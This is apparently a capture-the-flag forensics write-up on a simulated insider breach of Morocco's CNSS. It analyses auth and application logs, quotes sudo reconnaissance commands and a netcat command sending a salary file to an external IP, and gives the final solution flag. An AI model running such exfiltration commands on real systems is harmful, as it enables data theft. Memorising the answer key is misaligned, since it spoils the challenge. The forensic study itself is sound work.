# CNSS 

**Description**

In April 2025, Morocco faced its most devastating cybersecurity breach targeting the National Social Security Fund (CNSS), leaking personal and financial data of millions of citizens and employees. Preliminary investigations suggest the breach was facilitated by an insider within CNSS who exploited weak internal controls to exfiltrate sensitive data before the attack became public.

> Your mission is to analyze the system logs and uncover the complete attack chain.
> Follow the digital forensic trail to identify the malicious insider and their methods.

**🎯 Flag Format**: `CITEFLAG{username_YYYY-MM-DD_tool_filename_IP}`


https://www.mediafire.com/file/7oy640vcf53h0md/cnss_leaks.zip/file


---

**👤 Author:** *Reo-0x*

---

## Challenge Objectives

We need to identify:
1. **Username** of the malicious insider
2. **Exact timestamp** (date) of the unauthorized data access
3. **Tool** used to exfiltrate the data
4. **Name** of the exfiltrated file
5. **Destination IP address** where the data was sent

---

## Initial Log Analysis

The investigation began with examining multiple system log files provided in the challenge. Key log files included:

- `var_log_auth.log` - Authentication and authorization events
- `secure_app.log` - Application security events
- `var_log_syslog` - General system messages
- `.bash_history` - Command history for user xtle0o0
- Apache2 access logs - Web server access records

---

## Evidence Discovery

### 1. Identifying the Malicious User

Analyzing the authentication logs (`var_log_auth.log`) revealed extensive suspicious activity from user **xtle0o0**:

```bash
Apr  8 01:15:18 cnss-server sudo: xtle0o0 : TTY=pts/2 ; PWD=/home/xtle0o0 ; USER=root ; COMMAND=/usr/bin/find /var/www -name "secure_db_connect.php"
Apr  8 01:17:22 cnss-server sudo: xtle0o0 : TTY=pts/2 ; PWD=/var/www/html/secure ; USER=root ; COMMAND=/usr/bin/cat secure_db_connect.php
Apr  8 01:20:36 cnss-server sudo[25984]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)
Apr  8 01:23:45 cnss-server sudo: xtle0o0 : TTY=pts/2 ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/bin/ls -la /var/db/cnss
Apr  8 01:25:08 cnss-server sudo: xtle0o0 : TTY=pts/2 ; PWD=/var/db/cnss ; USER=root ; COMMAND=/usr/bin/grep -r "password" .
Apr  8 01:26:40 cnss-server systemd[17100]: Accepted password for operator from 192.168.89.99 port 42051 ssh2
Apr  8 01:32:17 cnss-server sudo: xtle0o0 : TTY=pts/2 ; PWD=/var/db/cnss ; USER=root ; COMMAND=/usr/bin/ls -la /var/db/cnss/employees
Apr  8 01:35:22 cnss-server sudo: xtle0o0 : TTY=pts/2 ; PWD=/var/db/cnss/employees ; USER=root ; COMMAND=/usr/bin/grep -l "SALARY" *
```

The logs show **xtle0o0** performing reconnaissance activities:
- Searching for database connection files
- Accessing secure directories
- Searching for password-related files
- Specifically looking for SALARY data files

### 2. Critical Evidence from secure_app.log

The most damning evidence was found in `secure_app.log` on **April 8, 2025 at 22:25:43**:

```bash
[2025-04-08 22:25:43.890] [CRITICAL] [SECURE-APP] Suspicious process execution: /usr/bin/netcat -w3 98.76.54.32 8080 < /tmp/backup_data.tmp by xtle0o0

[2025-04-08 22:25:43.891] [ALERT] [SECURE-APP] Possible data exfiltration attempt detected: user=xtle0o0, destination=98.76.54.32:8080, file_size=17.9MB, file_hash=69a70c0e7f0d49ca167e5e0c91e7323 (SALARY.csv)

[2025-04-08 22:25:55.123] [WARN] [SECURE-APP] Network connection established to external IP 98.76.54.32 from internal system
```

### 3. Attack Timeline Analysis

The complete attack timeline:

**Early Morning Reconnaissance (01:15 - 01:35)**:
- User xtle0o0 performed extensive system reconnaissance
- Searched for database files and salary-related data
- Escalated privileges using sudo

**Evening Data Exfiltration (22:25:43)**:
- Executed netcat command to transfer data
- Sent 17.9MB file containing SALARY.csv data
- Connected to external IP 98.76.54.32 on port 8080

### 4. Key Evidence Summary

**Malicious User**: `xtle0o0`

**Timestamp**: `2025-04-08 22:25:43` (data exfiltration time)

**Tool Used**: `netcat` (network utility for data transfer)

**Exfiltrated File**: `SALARY.csv` (17.9MB of sensitive salary data)

**Destination IP**: `98.76.54.32:8080` (external command and control server)

---

## Flag Construction

Based on the evidence gathered:

- **Username**: xtle0o0
- **Timestamp**: 2025-04-08 (date of the breach)
- **Tool**: netcat
- **Filename**: SALARY.csv
- **IP**: 98.76.54.32

**Final Flag**: `CITEFLAG{xtle0o0_2025-04-08_netcat_SALARY.csv_98.76.54.32}`

